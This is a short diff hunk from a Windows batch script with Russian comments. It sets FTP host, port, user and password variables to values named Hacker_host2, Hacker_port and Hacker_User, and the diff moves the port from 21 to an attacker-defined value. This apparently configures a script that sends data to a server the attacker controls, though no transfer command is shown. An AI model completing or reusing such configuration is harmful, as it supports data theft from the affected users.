@@ -21,7 +21,7 @@ rem Определяем переменные:
 rem FTP Host
 set host=%Hacker_host2%
 rem FTP Port
-set port=21
+set port=%Hacker_port%
 rem Ftp User
 set user=%Hacker_User%
 rem FTP Password
